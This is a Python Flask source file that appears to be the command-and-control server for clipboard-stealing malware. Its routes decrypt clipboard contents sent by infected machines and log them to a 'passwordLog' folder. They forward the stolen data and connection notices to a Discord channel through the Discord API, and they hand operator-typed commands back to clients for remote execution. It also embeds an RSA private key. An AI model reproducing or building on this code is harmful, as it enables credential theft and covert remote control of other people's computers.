import os
import random
import requests
from flask import Flask, request
import rsa

app = Flask(__name__) #creates an instance of this

#RSA Private key
private = rsa.PrivateKey(22801902741575260508046760451684121524343309971392815027806038442328813626689876929878295531764425101721113803279088975380306285103839798562486473563504890609732689910231035352994358600476885112341914819232866689789408515621209722745373194438974054762656866686749518758325281935986106093899741071523184790288397250570095386108667233843051192504696785064008214814463197996158290147894449246014411585018720395948432620796871823751561082698116083062968467223326531809351871820333024478963454054743945987929181103396110463090638025544498539475681820761973201801628104421055632663943101423395201694333712187265928179307257, 65537, 18904456802470234824674927585062739262175469540803341693025941052595268144806665898422832716151487524635194142258103048312997879077729152309271137541740363936094507015463071332300051490866404513161999202023556335958428242004950337753785686251150575484519597348437296515458507316352672148738308018604157351282327135493334495208537739362528863390211788632973323282898369170600992460840532717461147061007678346560712666798234316549552213240997248654432337026554529632433844992820728939550947936210228506561925974836406580040346322388721026455387043468932665609393794642715044192787742698558843503697610331035873617448973, 3311650058923074433241761864350234503213807126645929143772285621970103494195237265961704171263185554006226681975906911122622520882547127729873631157599066062170239050481487082307461223800648903976985296928144636087187688165667959862738308221176887817236903575118606623233247962337526959867243134862835356895802384627466949691807, 6885359967348204868366348467251138224886830616623836093746572209690471511384096796925844021145669543211268616522599313018121948324860526790119636847235011604661913324962194125071677623861514250184120923402448367624991396416753896664091399371168163582064357632376888614310129037687340469351)


public_key_for_commands = rsa.PublicKey(107201864084430543558230145717247400445999797193926385396882006881409911684282790515015283683116391089600936105784404298338294529408213801256597419045800169315007374627752173552165180105318136127400062621009046404765105867305344453059667793879482970705619012938060699202530055582108034356438834659746757773697, 65537)

#Sets up the routing so that when someone navigates to the local host with the correct port /output this is triggered
#Also is specified to take in post requests
"""
get_output receives the post request from the client and processes the data in that file. It adds the data in that file
to a file on the server so then the server has a copy of all the clipboard_data
"""
@app.route("/output", methods=["POST"])
def get_output():
    global private

    #Reference: https://stackoverflow.com/questions/5104957/how-do-i-create-a-file-at-a-specific-path
    #creates a file at the specified filepath
    filepath = os.path.join('C:/passwordLog', 'server_stored_clipboard_info')

    #if the path does not exist then it is created
    if not os.path.exists('C:/passwordLog'):
        os.makedirs('C:/passwordLog')
        filepath = os.path.join('C:/passwordLog', 'server_stored_clipboard_info')

    #Opens a file on the server side and sets it to append mode
    server_clipboard_file = open(filepath, "a")

    #gets the data and then decodes it from binary to UTF8 and from rsa using the private key
    s = request.data
    s = rsa.decrypt(s, private).decode('utf8')

    #data is written to the clipboard file
    server_clipboard_file.write(s + '\n')

    #from PDM project
    values = list()
    with open("credentials", "r") as f:
        values.append(f.readline().split('=')[1].strip())
        values.append(f.readline().split('=')[1].strip())

    #TODO: make sure whenever I am running the server script that it has access to the credentials
    token = values[0]
    channel_id = values[1]
    message = s

    message_post(token, channel_id, message)

    #post returns something so we return a random int between 1 and 1000
    s = random.randint(1, 1000)
    return str(s)

@app.route("/connect", methods=["POST"])
def show_when_connected():
    s = request.data
    s = rsa.decrypt(s, private).decode('utf8')
    print(s)


    values = list()
    with open("credentials", "r") as f:
        values.append(f.readline().split('=')[1].strip())
        values.append(f.readline().split('=')[1].strip())

    #TODO: make sure whenever I am running the server script that it has access to the credentials
    token = values[0]
    channel_id = values[1]
    message = s
    message_post(token, channel_id, message)

    # post returns something so we return a random int between 1 and 1000
    s = random.randint(1, 1000)
    return str(s)

#setup a global list of commands
#append to the list every time there is a new command, input() and a while loop in main
#then encrypt it and send back the 0th element in the list
#remove the element from the list
#if the len of list is 0 then send a predtermined message
#TODO: fix creds file
#TODO encrypt the traffic
#TODO: add variable time limits
@app.route("/command", methods=["GET"])
def command():
    command_input = input("Enter any command you want. Enter No for no command to be run: ")
    encrypted_command = rsa.encrypt(command_input.encode(),public_key_for_commands)
    return encrypted_command



#https://blog.apify.com/python-discord-api/
def message_post(token, channel_id, message):
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"

    headers = {
        "Authorization": f"{token}",
    }

    data = {
        "content": message
    }

    response = requests.post(url, headers=headers, json=data)

def main():
    #Starts a server on the local host on port 12345
    app.run(host="127.0.0.1", port=80)

main()